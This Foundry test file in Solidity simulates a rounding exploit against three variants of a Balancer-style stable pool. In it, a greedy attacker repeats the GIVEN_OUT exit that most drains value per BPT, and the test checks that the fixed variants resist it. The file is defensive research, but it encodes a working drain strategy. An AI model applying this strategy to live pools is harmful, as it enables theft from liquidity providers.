// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {MockRateProvider} from "../src/MockRateProvider.sol";

interface IPool {
    function initialize(uint256[2] calldata balances, uint256 amp, uint256 fee, uint256 supply, uint256 storedInvariant, uint256 protocolSwapFee, address rateProvider) external;
    function swapGivenIn(uint256 i, uint256 amount) external returns (uint256);
    function swapGivenOut(uint256 i, uint256 amount) external returns (uint256);
    function exitGivenIn(uint256 j, uint256 bpt) external returns (uint256);
    function exitGivenOut(uint256 j, uint256 amount) external returns (uint256);
    function joinGivenIn(uint256 i, uint256 amount) external returns (uint256);
    function joinGivenOut(uint256 i, uint256 bpt) external returns (uint256);
    function getRate() external view returns (uint256);
    function getState() external view returns (uint256[2] memory, uint256[2] memory, uint256, uint256);
}

/// The three Fe pool contracts on a real EVM. Each faces its own greedy
/// attacker repeating the November 2025 operation: at every step it executes
/// each candidate GIVEN_OUT exit, rolls the state back, and keeps the one that
/// leaves the least value per BPT. Results go to cache/pool-attack.csv.
contract PoolAttack is Test {
    string internal constant OUT = "cache/pool-attack.csv";
    string[3] internal NAMES = ["faithful", "typed", "guarded"];
    string[6] internal OPS = ["swapGivenIn", "swapGivenOut", "exitGivenIn", "exitGivenOut", "joinGivenIn", "joinGivenOut"];

    uint256 internal constant RATED = 1;
    uint256 internal constant STEPS = 200;
    uint256 internal constant CAP = 96;

    MockRateProvider internal provider;

    function _deploy(string memory name) internal returns (IPool pool) {
        bytes memory code = vm.parseBytes(string.concat("0x", vm.readFile(string.concat("../../ingots/balancer_v2/out/", name, ".bin"))));
        address deployed;
        assembly {
            deployed := create(0, add(code, 0x20), mload(code))
        }
        require(deployed != address(0), name);
        pool = IPool(deployed);
    }

    function _pools() internal returns (IPool[3] memory pools) {
        pools[0] = _deploy("FaithfulPool");
        pools[1] = _deploy("TypedPool");
        pools[2] = _deploy("GuardedPool");
    }

    function setUp() public {
        provider = new MockRateProvider(1.21e18);
    }

    /// Repeats the most damaging exit until none is possible; returns the
    /// value per BPT before and after, and the BPT supply at the end.
    function _attack(IPool pool) internal returns (uint256 start, uint256 end, uint256 steps, uint256 supplyEnd) {
        start = pool.getRate();
        for (steps = 0; steps < STEPS; steps++) {
            (uint256[2] memory balances,,,) = pool.getState();
            uint256 best;
            uint256 lowest = type(uint256).max;
            for (uint256 a = 1; a <= CAP && a * 2 <= balances[RATED]; a++) {
                uint256 snap = vm.snapshotState();
                try pool.exitGivenOut(RATED, a) {
                    uint256 rate = pool.getRate();
                    if (rate < lowest) {
                        lowest = rate;
                        best = a;
                    }
                } catch {}
                vm.revertToState(snap);
            }
            if (best == 0) break;
            pool.exitGivenOut(RATED, best);
        }
        end = pool.getRate();
        (,, supplyEnd,) = pool.getState();
    }

    function test_repeatedExitsOnEachKernel() public {
        IPool[3] memory pools = _pools();
        // 1,000 wei of each token, with a BPT supply equal to the pool's invariant.
        pools[0].initialize([uint256(1000), 1000], 200_000, 0, 1e18, 0, 0, address(provider));
        uint256 supply = _invariantSupply(pools[0]);
        for (uint256 k = 0; k < 3; k++) {
            pools[k].initialize([uint256(1000), 1000], 200_000, 0, supply, supply, 0, address(provider));
        }

        int256[3] memory change;
        for (uint256 k = 0; k < 3; k++) {
            (uint256 start, uint256 end, uint256 steps, uint256 supplyEnd) = _attack(pools[k]);
            change[k] = int256(end) - int256(start);
            // With no fees, what the remaining holders lose per BPT, times the BPT they hold, is the attacker's gain.
            int256 holderLoss = (int256(start) - int256(end)) * int256(supplyEnd);
            vm.writeLine(OUT, string.concat(
                "attack,", NAMES[k], ",", vm.toString(steps), ",", vm.toString(start), ",", vm.toString(end), ",", vm.toString(holderLoss)
            ));
        }
        assertLt(change[0], 0, "faithful kernel should lose value per BPT");
        assertGe(change[1], 0, "typed kernel should not lose value per BPT");
        assertGe(change[2], 0, "guarded kernel should not lose value per BPT");
    }

    function _invariantSupply(IPool pool) internal view returns (uint256) {
        // getRate() is D * 1e18 / supply; with supply 1e18 it returns D * 1e18 / 1e18 = D.
        return pool.getRate();
    }

    function _operate(IPool pool, uint256 op) internal {
        if (op == 0) pool.swapGivenIn(0, 10e18);
        else if (op == 1) pool.swapGivenOut(0, 10e18);
        else if (op == 2) pool.exitGivenIn(RATED, 10e18);
        else if (op == 3) pool.exitGivenOut(RATED, 10e18);
        else if (op == 4) pool.joinGivenIn(RATED, 10e18);
        else pool.joinGivenOut(RATED, 10e18);
    }

    /// Gas for one operation of each kind, 10 tokens or 10 BPT, on a pool with
    /// the osETH/wETH pool's balances and parameters before the exploit,
    /// including its 50% protocol swap fee; identical inputs for all three kernels.
    function test_gasPerOperation() public {
        IPool[3] memory pools = _pools();
        uint256[2] memory balances = [uint256(4_922_356_564_867_078_856_521), 6_851_581_236_039_298_760_900];
        pools[0].initialize(balances, 200_000, 1e14, 1e18, 0, 5e17, address(provider));
        uint256 supply = _invariantSupply(pools[0]);
        for (uint256 k = 0; k < 3; k++) {
            pools[k].initialize(balances, 200_000, 1e14, supply, supply, 5e17, address(provider));
            for (uint256 op = 0; op < 6; op++) {
                uint256 snap = vm.snapshotState();
                uint256 before = gasleft();
                _operate(pools[k], op);
                uint256 used = before - gasleft();
                vm.revertToState(snap);
                vm.writeLine(OUT, string.concat("gas,", NAMES[k], ",", OPS[op], ",", vm.toString(used)));
            }
        }
    }
}
